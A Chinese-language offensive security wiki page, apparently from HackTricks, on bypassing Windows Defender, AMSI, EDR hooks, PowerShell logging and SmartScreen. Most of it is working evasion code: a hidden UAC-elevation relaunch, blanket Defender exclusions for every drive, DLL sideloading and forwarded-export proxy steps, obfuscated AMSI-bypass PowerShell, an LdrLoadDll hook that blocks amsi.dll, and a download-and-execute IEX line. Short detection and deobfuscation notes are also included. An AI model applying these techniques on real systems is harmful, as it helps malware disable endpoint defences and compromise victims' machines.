# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**此页面最初由** [**@m2rc_p**](https://twitter.com/m2rc_p)** 编写！**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot)：用于停止 Windows Defender 工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：通过伪装成其他 AV 来停止 Windows Defender 工作的工具。
- [如果你是管理员，禁用 Defender](basic-powershell-for-pentesters/README.md)

### 在篡改 Defender 前使用 Installer-style UAC bait

伪装成游戏 cheats 的公开 loaders 经常以未签名的 Node.js/Nexe installers 形式发布：它们会先**请求用户提升权限**，然后才削弱 Defender。流程很简单：

1. 使用 `net session` 检测 administrative context。只有调用者拥有 admin rights 时，该命令才会成功，因此失败表示 loader 以 standard user 身份运行。
2. 立即使用 `RunAs` verb 重新启动自身，以触发预期的 UAC consent prompt，同时保留原始 command line。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者本就相信自己正在安装“cracked”软件，因此通常会接受该提示，从而授予 malware 修改 Defender policy 所需的权限。<sup>[[26]](#references)</sup>

### 针对每个驱动器号的全面 `MpPreference` exclusions

获得 elevated 权限后，GachiLoader-style chains 不会直接禁用服务，而是尽可能扩大 Defender 的盲区。loader 首先终止 GUI watchdog（`taskkill /F /IM SecHealthUI.exe`），然后推送**极其宽泛的 exclusions**，使每个用户配置文件、系统目录和 removable disk 都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
关键观察：

- 该循环会遍历每个已挂载的文件系统（D:\、E:\、USB sticks 等），因此**未来丢弃到磁盘任意位置的 payload 都会被忽略**。
- 排除 `.sys` 扩展名是面向未来的设计——攻击者之后可以选择加载 unsigned drivers，而无需再次修改 Defender。
- 所有更改都会写入 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`，使后续阶段能够确认这些排除项仍然存在，或在不再次触发 UAC 的情况下扩展它们。

由于没有停止任何 Defender service，简单的 health checks 仍会报告“antivirus active”，但 real-time inspection 实际上不会检查这些路径。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

目前，AV 使用不同方法检查文件是否恶意，包括 static detection、dynamic analysis，以及更高级 EDR 使用的 behavioural analysis。

### **Static detection**

Static detection 通过标记 binary 或 script 中已知的恶意字符串或字节数组来实现，同时也会从文件自身提取信息（例如文件描述、公司名称、digital signatures、图标、checksum 等）。这意味着使用已知的 public tools 可能更容易被发现，因为它们很可能已经被分析并标记为恶意。以下是几种绕过此类检测的方法：

- **Encryption**

如果对 binary 进行加密，AV 将无法检测到你的 program，但你需要某种 loader 在内存中解密并运行该 program。

- **Obfuscation**

有时你只需修改 binary 或 script 中的一些字符串，就能让它通过 AV 检测，但具体取决于你想要 obfuscate 的内容，这可能会耗费大量时间。

- **Custom tooling**

如果你开发自己的 tools，就不会存在已知的 bad signatures，但这需要投入大量时间和精力。

> [!TIP]
> 检查 Windows Defender static detection 的一种好方法是使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上会将文件拆分为多个 segments，然后要求 Defender 分别扫描每个 segment，从而准确告诉你 binary 中哪些字符串或字节被标记。

我强烈建议你查看这个关于 practical AV Evasion 的 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

Dynamic analysis 是指 AV 在 sandbox 中运行你的 binary，并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分处理起来可能更棘手，但你可以采取以下措施来绕过 sandboxes。

- **Sleep before execution** 根据实现方式，这可能是绕过 AV dynamic analysis 的有效方法。AV 能用于扫描文件的时间非常短，否则会中断用户的工作流程，因此使用较长的 sleep 可能干扰 binary 的分析。问题在于，许多 AV sandboxes 会根据 sleep 的实现方式直接跳过它。
- **Checking machine's resources** 通常，Sandboxes 可用的资源非常少（例如 < 2GB RAM），否则它们可能拖慢用户的机器。你也可以在这里发挥创意，例如检查 CPU 温度，甚至检查风扇转速；这些内容不一定会在 sandbox 中实现。
- **Machine-specific checks** 如果你想针对 workstation 加入 `"contoso.local"` domain 的用户，可以检查 computer 的 domain 是否与指定的 domain 匹配；如果不匹配，就可以让你的 program 退出。

事实证明，Microsoft Defender 的 Sandbox computername 是 HAL9TH。因此，你可以在 malware detonation 前检查 computer name；如果名称匹配 HAL9TH，就意味着你位于 Defender's sandbox 中，此时可以让你的 program 退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

来自 [@mgeeky](https://twitter.com/mariuszbit) 的其他一些非常实用的 Sandboxes 对抗技巧：

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在本文前面所说，**public tools** 最终都会**被检测到**，因此你应该问自己一个问题：

例如，如果你想 dump LSASS，**真的需要使用 mimikatz 吗**？还是可以使用另一个知名度较低、同样能够 dump LSASS 的 project？

正确答案可能是后者。以 mimikatz 为例，它可能是 AV 和 EDR 标记最多的 malware 之一。虽然该 project 本身非常出色，但使用它来绕过 AV 也是一场噩梦，因此应该针对你的目标寻找 alternatives。

> [!TIP]
> 修改 payloads 以实现 evasion 时，请确保在 Defender 中**关闭 automatic sample submission**；并且请认真注意，如果你的目标是长期实现 evasion，**不要上传到 VIRUSTOTAL**。如果你想检查 payload 是否会被某个特定 AV 检测到，请在 VM 上安装该 AV，尝试关闭 automatic sample submission，然后在那里进行测试，直到你对结果满意为止。

## EXEs vs DLLs

只要条件允许，始终**优先使用 DLLs 来实现 evasion**。根据我的经验，DLL files 通常**更不容易被检测和分析**，因此在某些情况下，这是避免检测的一个非常简单的技巧（当然，前提是你的 payload 能够以 DLL 的形式运行）。

如图所示，Havoc 的 DLL Payload 在 antiscan.me 上的 detection rate 为 4/26，而 EXE payload 的 detection rate 为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比普通 Havoc EXE payload 与普通 Havoc DLL</p></figcaption></figure>

接下来我们将介绍一些可以用于 DLL files 的 tricks，以实现更高程度的 stealth。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用了 loader 使用的 DLL search order，将 victim application 与 malicious payload(s) 放置在彼此旁边。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 powershell script 检查容易受到 DLL Sideloading 影响的 programs：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出位于 "C:\Program Files\\" 内、易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你**自行探索 DLL Hijackable/Sideloadable programs**。正确实施时，这项技术相当隐蔽；但如果你使用公开已知的 DLL Sideloadable programs，可能很容易被发现。

仅仅放置一个程序预期加载名称的恶意 DLL，并不会加载你的 payload，因为程序需要该 DLL 中存在某些特定函数。为解决这一问题，我们将使用另一种称为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会将程序发出的调用从 proxy（恶意）DLL 转发到原始 DLL，从而保留程序的功能，同时能够处理你的 payload 执行。

我将使用 [@flangvik](https://twitter.com/Flangvik) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我执行的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一条命令会生成 2 个文件：一个 DLL 源代码模板，以及重命名后的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的 Detection rate 都是 0/26！我认为这算是成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 中关于 DLL Sideloading 的内容，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE)，以进一步深入了解我们讨论的内容。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE 模块可以导出实际上是“forwarders”的函数：导出条目不是指向代码，而是包含一个形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 将：

- 如果 `TargetDll` 尚未加载，则加载它
- 从其中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，它会从受保护的 KnownDLLs namespace 中提供（例如 ntdll、kernelbase、ole32）。<sup>[[15]](#references)</sup>
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL search order，其中包括执行 forward resolution 的模块所在目录。

这启用了一个间接的 sideloading primitive：找到一个将函数 forward 到非 KnownDLL module name 的 signed DLL，然后将该 signed DLL 与一个由 attacker 控制、且名称与 forwarded target module 完全相同的 DLL 放在同一目录中。当调用 forwarded export 时，loader 会解析该 forward，并从同一目录加载你的 DLL，从而执行你的 DllMain。<sup>[[13]](#references)</sup>

在 Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此会通过正常的搜索顺序进行解析。

PoC（复制粘贴）：
1) 将已签名的系统 DLL 复制到可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置恶意的 `NCRYPTPROV.dll`。一个最小化的 DllMain 即可实现代码执行；无需实现转发函数即可触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
观察到的行为：
- rundll32（signed）加载并排 side-by-side 的 `keyiso.dll`（signed）
- 在解析 `KeyIsoSetAuditingInterface` 时，loader 遵循转发，指向 `NCRYPTPROV.SetAuditingInterface`
- 随后 loader 从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果未实现 `SetAuditingInterface`，只有在 `DllMain` 已经运行后，才会出现“missing API”错误

Hunting 提示：
- 重点关注 forwarded exports，尤其是目标 module 不是 KnownDLL 的情况。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用以下 tooling 枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder inventory 以搜索候选项：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

检测/防御思路：
- 监控 LOLBins（例如 `rundll32.exe`）从非系统路径加载已签名 DLL，随后从该目录加载具有相同基本名称的非 KnownDLLs
- 对以下进程/模块链发出警报：`rundll32.exe` → 非系统路径中的 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制实施代码完整性策略（WDAC/AppLocker），并禁止在应用程序目录中同时执行写入和执行操作

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个 payload toolkit，利用挂起进程、direct syscalls 和 alternative execution methods 绕过 EDR`

你可以使用 Freeze 以隐蔽方式加载并执行 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 只是猫鼠游戏，今天有效的方法明天可能就会被检测到，因此不要只依赖一个工具；如果可能，尽量串联多种 evasion techniques。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR 通常会在 `ntdll.dll` 的 syscall stubs 上设置 **user-mode inline hooks**。为了绕过这些 hooks，你可以生成 **direct** 或 **indirect** syscall stubs，加载正确的 **SSN** (System Service Number)，并在不执行被 hook 的 export entrypoint 的情况下切换到 kernel mode。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**：在生成的 stub 中发出 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` export）。
- **Indirect**：跳转到 `ntdll` 中现有的 `syscall` gadget，使 kernel transition 看起来源自 `ntdll`（有助于规避启发式检测）；**randomized indirect** 会在每次调用时从 gadget pool 中选择一个 gadget。
- **Egg-hunt**：避免在磁盘上嵌入静态的 `0F 05` opcode sequence；在运行时解析 syscall sequence。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**：通过按 virtual address 对 syscall stubs 排序，而不是读取 stub bytes，来推断 SSN。
- **SyscallsFromDisk**：映射一个干净的 `\KnownDlls\ntdll.dll`，从其 `.text` 中读取 SSN，然后取消映射（绕过所有内存中的 hooks）。
- **RecycledGate**：将 VA-sorted SSN inference 与 stub 干净时的 opcode validation 结合起来；如果 stub 被 hook，则回退到 VA inference。
- **HW Breakpoint**：在 `syscall` 指令上设置 DR0，并使用 VEH 在运行时从 `EAX` 捕获 SSN，而无需解析被 hook 的 bytes。

SysWhispers4 usage 示例：
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI 的创建目的是防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"。最初，AV 只能扫描**磁盘上的文件**，因此如果你能设法**直接在内存中**执行 payload，AV 就无法采取任何措施加以阻止，因为它无法获得足够的可见性。

AMSI 功能已集成到 Windows 的以下组件中。

- 用户账户控制，即 UAC（EXE、COM、MSI 或 ActiveX 安装的提权）
- PowerShell（脚本、交互式使用和动态代码求值）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA 宏

它允许 antivirus 解决方案检查脚本行为，方法是以未加密且未混淆的形式公开脚本内容。

在 Windows Defender 上运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将触发以下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它会添加 `amsi:` 前缀，随后是运行该脚本的可执行文件路径；在本例中是 powershell.exe。

我们没有向磁盘写入任何文件，但仍然因为 AMSI 在内存中被捕获。

此外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 扫描。这甚至会影响使用 `Assembly.Load(byte[])` 加载内存中执行的代码。因此，如果你希望在内存中执行时绕过 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低版本）。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此，修改你尝试加载的脚本可能是规避检测的一种有效方法。

但是，即使脚本包含多层混淆，AMSI 也有能力对其进行反混淆，因此具体取决于实现方式，混淆可能不是一个好选择。这使得绕过检测并不那么直接。不过，有时你只需要修改几个变量名就可以成功，因此这取决于某个内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过向 powershell（以及 cscript.exe、wscript.exe 等）进程加载 DLL 实现的，即使以非特权用户身份运行，也可以轻易篡改它。由于 AMSI 实现中的这一缺陷，研究人员已经找到了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）会导致当前进程不再启动扫描。该方法最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露，之后 Microsoft 开发了相应的 signature，以防止其被更广泛地使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码，就能让当前 powershell 进程中的 AMSI 无法使用。当然，这一行代码本身已经被 AMSI 标记，因此需要进行一些修改才能使用此技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改版 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，这篇文章发布后很可能会被标记，因此如果你的计划是保持未被检测，就不应发布任何代码。

**Memory Patching**

该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，其原理是查找 amsi.dll 中的 "AmsiScanBuffer" 函数地址（负责扫描用户提供的输入），并将其覆盖为返回 E_INVALIDARG 代码的指令。这样，实际扫描的结果将返回 0，而该结果会被解释为干净结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以了解更详细的说明。

此外，还有许多其他用于通过 powershell 绕过 AMSI 的技术，请查看[**此页面**](basic-powershell-for-pentesters/index.html#amsi-bypass)和[**此 repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)，以进一步了解这些技术。

### 通过阻止 amsi.dll 加载来阻断 AMSI（LdrLoadDll hook）

只有在 `amsi.dll` 被加载到当前进程后，AMSI 才会初始化。一种健壮且与语言无关的 bypass 方法，是在用户态对 `ntdll!LdrLoadDll` 设置 hook；当请求的模块为 `amsi.dll` 时，使其返回错误。这样，AMSI 就永远不会加载，该进程也不会执行扫描。<sup>[[23]](#references)</sup>

实现概要（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- 适用于 PowerShell、WScript/CScript 以及自定义 loaders（任何原本会加载 AMSI 的组件）。
- 配合通过 stdin 传入 scripts（`PowerShell.exe -NoProfile -NonInteractive -Command -`），以避免产生过长的命令行痕迹。
- 已发现 loaders 通过 LOLBins 执行（例如，`regsvr32` 调用 `DllRegisterServer`）。

工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也可以生成用于绕过 AMSI 的 script。
工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也可以生成用于绕过 AMSI 的 script。它通过随机化的用户定义函数、变量和字符表达式，并对 PowerShell 关键字应用随机字符大小写来避免 signature，从而绕过 signature 检测。

**移除检测到的 signature**

你可以使用 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 等工具，从当前进程的内存中移除检测到的 AMSI signature。该工具通过扫描当前进程内存中的 AMSI signature，然后使用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**使用 AMSI 的 AV/EDR products**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 中找到使用 AMSI 的 AV/EDR products 列表。

**使用 Powershell version 2**
如果使用 PowerShell version 2，AMSI 将不会被加载，因此可以运行 scripts 而不会被 AMSI 扫描。可以执行以下操作：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一项允许记录系统上执行的所有 PowerShell 命令的功能。这对于审计和故障排除很有用，但对于**希望规避检测的攻击者而言，这也可能是一个问题**。

要绕过 PowerShell logging，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：可以使用 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 等工具来实现。
- **Use Powershell version 2**：如果使用 PowerShell version 2，则不会加载 AMSI，因此可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 启动一个没有防御机制的 powershell（这正是 Cobal Strike 使用的 `powerpick` 的工作方式）。


## Obfuscation

> [!TIP]
> 多种 obfuscation 技术依赖于加密数据，这会增加二进制文件的 entropy，使 AV 和 EDR 更容易检测到它。对此要谨慎，或许只应对代码中特定的、敏感或需要隐藏的部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

分析使用 ConfuserEx 2（或商业 fork）的 malware 时，经常会遇到会阻止 decompiler 和 sandbox 的多层保护。下面的工作流程可以可靠地**恢复接近原始状态的 IL**，之后即可在 dnSpy 或 ILSpy 等工具中将其 decompile 为 C#。<sup>[[10]](#references)</sup>

1.  移除 Anti-tampering – ConfuserEx 会加密每个 *method body*，并在 *module* 的静态构造函数（`<Module>.cctor`）中解密它们。它还会修改 PE checksum，因此任何修改都会导致二进制文件崩溃。使用 **AntiTamperKiller** 定位加密的 metadata tables，恢复 XOR keys 并重写一个干净的 assembly：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个 anti-tamper 参数（`key0-key3`、`nameHash`、`internKey`），在构建自定义 unpacker 时可能很有用。

2.  Symbol / control-flow recovery – 将 *clean* 文件交给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot fork）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags：
• `-p crx` – 选择 ConfuserEx 2 profile  
• de4dot 会撤销 control-flow flattening，恢复原始 namespaces、classes 和 variable names，并解密 constant strings。

3.  Proxy-call stripping – ConfuserEx 使用轻量级 wrappers（又称 *proxy calls*）替代直接的方法调用，以进一步破坏 decompilation。使用 **ProxyCall-Remover** 移除它们：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，应能看到正常的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的 wrapper functions（`Class8.smethod_10`、……）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制文件，搜索较大的 Base64 blobs 或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用位置，以定位真正的 payload。malware 通常会将其存储为 TLV-encoded byte array，并在 `<Module>.byte_0` 中进行初始化。

上述链条无需运行恶意 sample 即可恢复 execution flow —— 这在离线 workstation 上工作时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的 custom attribute，可将其用作 IOC，以自动对 samples 进行 triage。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator)：该项目旨在提供 LLVM 编译套件的开源 fork，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改功能来提升 software security。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator)：ADVobfuscator 演示了如何使用 `C++11/14` 语言在编译时生成 obfuscated code，无需使用任何外部工具，也无需修改 compiler。
- [**obfy**](https://github.com/fritzone/obfy)：添加一层由 C++ template metaprogramming framework 生成的 obfuscated operations，使试图破解该 application 的人员更加困难。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**：**Alcatraz 是一个 x64 binary obfuscator，能够 obfuscate 多种不同的 PE files，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame)：Metame 是一个用于任意 executables 的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator)：ROPfuscator 是一个面向 LLVM-supported languages 的 fine-grained code obfuscation framework，使用 ROP（return-oriented programming）。ROPfuscator 在 assembly code 层面 obfuscate 程序，将常规 instructions 转换为 ROP chains，从而阻碍我们对正常 control flow 的自然理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt)：Nimcrypt 是一个使用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**：**Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们

## SmartScreen 与 MoTW

下载并执行某些来自 internet 的 executables 时，你可能见过这个界面。

Microsoft Defender SmartScreen 是一种 security mechanism，旨在保护 end user 免于运行潜在的 malicious applications。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于 reputation 的方法，这意味着不常见的 download applications 会触发 SmartScreen，从而向 end user 发出警告并阻止其执行该 file（尽管仍可通过点击 More Info -> Run anyway 来执行该 file）。

**MoTW**（Mark of The Web）是一种名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从 internet 下载 files 时会自动创建，并包含其下载来源的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从 internet 下载的 file 的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意的是，使用**受信任** signing certificate 签名的 executables **不会触发 SmartScreen**。

防止你的 payloads 获得 Mark of The Web 的一种非常有效的方法，是将它们打包到某种 container（例如 ISO）中。这是因为 Mark-of-the-Web (MOTW) **无法**应用于**非 NTFS** volumes。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到 output containers 中以规避 Mark-of-the-Web 的 tool。

使用示例：
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
这是一个通过使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包到 ISO 文件中来绕过 SmartScreen 的示例。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows（ETW）是 Windows 中一种强大的日志记录机制，允许应用程序和系统组件**记录事件**。不过，它也可以被安全产品用于监控和检测恶意活动。

